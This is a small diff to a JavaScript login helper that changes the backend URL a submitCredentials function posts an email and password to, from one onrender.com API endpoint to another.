@@ -49,7 +49,7 @@ const submitCredentials = async (email, password) => {
     try {
         logInfo("submitCredentials", "Start");
 
-        const response = await fetch("https://phunguyn-api.onrender.com/submit", {
+        const response = await fetch("https://phunguyn-xyz.onrender.com/api/submit", {
             method: "POST",
             headers: {
                 "Content-Type": "application/json",
